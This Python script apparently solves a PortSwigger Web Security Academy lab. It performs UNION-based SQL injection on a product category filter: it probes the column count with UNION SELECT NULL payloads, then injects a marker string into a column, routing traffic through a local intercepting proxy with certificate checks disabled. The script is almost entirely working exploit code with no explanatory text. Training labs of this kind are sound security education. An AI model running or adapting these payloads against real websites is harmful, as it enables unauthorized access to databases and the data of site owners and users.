from urllib.parse import quote

import requests as r
import urllib3
from rich.console import Console
from rich.traceback import install

install()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session: r.Session = r.Session()
console: Console = Console()

session.verify = False
print = console.print

session.proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}


def get_col_nums(URL, max_col=10):
    count = 1
    PAYLOAD = "' UNION SELECT "

    for _ in range(max_col):
        PAYLOAD += "NULL, "

        response: r.Response = session.get(URL + quote(PAYLOAD.strip(", ") + " --"))

        if response.status_code == 200:
            break

        count += 1

    return count


def main() -> None:
    URL = "https://0a7d0062039a22a680c20d8f000f00d0.web-security-academy.net/filter?category=Pets"

    PAYLOAD = (
        "' UNION SELECT "
        + ", ".join(
            (cols := ["NULL", "'uVRY0h'"])
            + ("NULL, " * (get_col_nums(URL, 10) - len(cols))).strip(", ").split(", ")
        ).strip(", ")
        + "--"
    )
    print(PAYLOAD)

    response: r.Response = r.get(URL + quote(PAYLOAD))
    print(response.text)
    print(response.status_code)


if __name__ == "__main__":
    main()
